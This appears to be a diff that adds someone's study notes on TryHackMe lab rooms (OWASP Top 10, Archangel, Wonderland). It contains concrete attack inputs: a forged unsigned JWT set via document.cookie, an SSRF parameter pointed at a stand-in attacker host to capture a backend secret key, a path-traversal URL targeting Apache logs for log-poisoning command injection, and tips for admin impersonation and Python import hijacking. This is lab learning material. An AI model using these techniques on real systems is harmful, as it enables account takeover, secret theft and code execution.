@@ -1,0 +1,46 @@
+########################
+### THM OWASP TOP 10 2021
+## brocken access control
+e.g.: url...?id=2222
+
+## injection
+sql injection, command injection (don't forget to try in the query, e.g.: ?cmd=<your command>)
+
+## insecure design
+try brute force from differnet IP addresses and see if it works...
+
+## vulnerable and outdated components
+
+## Identification and authentication failures
+say there is an existing user with the name admin, and we want access to their account, so what we can do is try to re-register that username but with slight modification. We will enter " admin" without the quotes (notice the space at the start). Now when you enter that in the username field and enter other required information like email id or password and submit that data, it will register a new user, but that user will have the same right as the admin account. That new user will also be able to see all the content presented under the user admin.
+
+## software and data integrity failure
+# software integrity failure
+people don't check agianst the hash (i.e.: don't forget to use integrity in html)
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+
+# data integrity failure
+SOME old JWT libraries allowed setting in jwt token header alg value to none and removing the signature (the third part of the jwt token) but don't forget the "." after the second part e.g.:
+document.cookie = "jwt-session=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzExMzc3MDc3fQ==."; 
+
+## SSRF
+let's say we have a url: https://www.mysite.com/sms?server=attacker.thm&msg=ABC
+where server is a server of an sms provider, and backend will send a request to sms provider with a secret key
+we can change ?server=<my ip> and see the secure key/headers that their backend sends 
+
+
+
+
+#########################
+## THM Archangel
+check url for file inclusion or cmd
+There can also be a possible cmd injection because of the bug in a logger 
+e.g.: http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log
+in logs it prints our agent (e.g. Mozilla or Android or whatever we put into User-Agent header) 
+
+#########################
+## THM Wonderland 
+# substitute python import
+python searches for scripts in the current directory first and then it searches in system directories
+
+
